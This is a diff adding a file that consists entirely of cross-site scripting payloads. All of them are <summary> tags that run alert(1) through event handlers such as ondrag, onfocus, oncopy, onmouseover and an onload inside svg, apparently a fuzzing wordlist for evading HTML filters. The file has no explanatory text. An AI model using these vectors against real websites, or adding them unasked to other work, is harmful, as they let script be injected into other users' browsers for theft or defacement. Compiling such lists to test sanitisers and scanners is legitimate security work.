@@ -1,0 +1,29 @@
+<summary draggable="true" ondrag="alert(1)">test</summary>
+<summary draggable="true" ondragend="alert(1)">test</summary>
+<summary draggable="true" ondragenter="alert(1)">test</summary>
+<summary draggable="true" ondragleave="alert(1)">test</summary>
+<summary draggable="true" ondragstart="alert(1)">test</summary>
+<summary id=x tabindex=1 onactivate=alert(1)></summary>
+<summary id=x tabindex=1 onbeforeactivate=alert(1)></summary>
+<summary id=x tabindex=1 onfocus=alert(1)></summary>
+<summary id=x tabindex=1 onfocusin=alert(1)></summary>
+<summary onbeforecopy="alert(1)" contenteditable>test</summary>
+<summary onbeforecut="alert(1)" contenteditable>test</summary>
+<summary onbeforepaste="alert(1)" contenteditable>test</summary>
+<summary onclick="alert(1)">test</summary>
+<summary oncontextmenu="alert(1)">test</summary>
+<summary oncopy="alert(1)" contenteditable>test</summary>
+<summary oncut="alert(1)" contenteditable>test</summary>
+<summary ondblclick="alert(1)">test</summary>
+<summary onkeydown="alert(1)" contenteditable>test</summary>
+<summary onkeypress="alert(1)" contenteditable>test</summary>
+<summary onkeyup="alert(1)" contenteditable>test</summary>
+<summary onmousedown="alert(1)">test</summary>
+<summary onmouseenter="alert(1)">test</summary>
+<summary onmouseleave="alert(1)">test</summary>
+<summary onmousemove="alert(1)">test</summary>
+<summary onmouseout="alert(1)">test</summary>
+<summary onmouseover="alert(1)">test</summary>
+<summary onmouseup="alert(1)">test</summary>
+<summary onpaste="alert(1)" contenteditable>test</summary>
+<svg><summary onload=alert(1)></summary>
